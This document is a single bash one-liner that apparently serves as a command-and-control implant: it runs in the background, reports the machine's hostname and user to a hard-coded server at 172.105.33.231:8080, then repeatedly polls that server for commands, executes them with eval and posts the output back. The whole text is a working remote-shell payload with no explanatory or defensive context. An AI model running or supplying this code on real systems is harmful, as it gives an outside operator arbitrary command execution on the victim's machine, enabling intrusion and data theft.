nohup `s=172.105.33.231:8080&&i=5c90a364-03c29a39-6a4ca645&&hname=$(hostname)&&p=http://;curl -s "$p$s/5c90a364/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/03c29a39" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c")&&if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/6a4ca645 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;` &
